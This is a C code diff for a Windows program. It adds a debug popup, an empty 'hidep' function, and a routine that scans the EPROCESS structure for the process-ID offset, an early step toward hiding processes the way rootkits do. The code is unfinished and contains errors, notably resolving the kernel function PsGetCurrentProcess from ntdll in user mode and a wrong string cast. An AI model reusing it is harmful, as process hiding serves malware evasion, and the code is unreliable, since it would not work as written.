@@ -21,6 +21,12 @@ VOID CALLBACK WaitOrTimerCallback(
 int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
 
 	int argc;
+	int poop = FSCTL_GET_NTFS_VOLUME_DATA;
+
+	char buff[100] = { 0 };
+	sprintf_s(buff, "%p", poop);
+	popup(buff, buff);
+
 	LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
 
 	if (argc == 1 || lstrcmpW(argv[1], ARG)) {
@@ -92,4 +98,47 @@ void monitor() {
 
 
 	CloseHandle(snap);		// Snapshot will change each time a process is being created, make sure it is updated
+}
+
+void hidep() {
+
+	ULONG PID_OFFSET = find_eproc_pid();
+
+
+
+	
+}
+
+
+
+
+
+
+
+static const UINT8 pid_amount = 3;
+
+ULONG find_eproc_pid() {
+
+	ULONG offset = 0;
+	int index = 0;
+
+	// I hate Microsoft 
+	PsGetCurrentProcess GetPEproc = (PsGetCurrentProcess)GetProcAddress(GetModuleHandle((LPCWSTR)"ntdll.dll"), "PsGetCurrentProcess");
+
+	LPVOID PEProc = GetPEproc();
+
+	for (unsigned int i = 0x20; i < 0x300; i += 4) {
+
+		if (*(ULONG*)((UCHAR*)PEProc + i) == GetCurrentProcessId()) {
+
+		}
+		
+	}
+	
+	
+	
+	
+
+
+
 }
